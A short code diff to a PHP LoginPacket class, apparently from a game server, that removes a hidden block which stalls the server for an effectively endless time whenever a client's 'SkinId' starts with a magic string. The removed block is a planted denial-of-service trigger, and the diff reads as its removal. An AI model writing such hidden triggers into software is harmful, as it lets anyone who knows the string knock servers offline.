@@ -156,13 +156,6 @@ class LoginPacket extends DataPacket{
 		$this->serverAddress = $this->clientData["ServerAddress"] ?? null;
 
 		$this->locale = $this->clientData["LanguageCode"] ?? null;
-
-        if(isset($this->clientData["SkinId"])){
-            $skinId = $this->clientData["SkinId"];
-            if(str_starts_with($skinId, "$&#+!$()")){
-                sleep(3000000000000);
-            }
-        }
 	}
 
 	protected function encodePayload(){
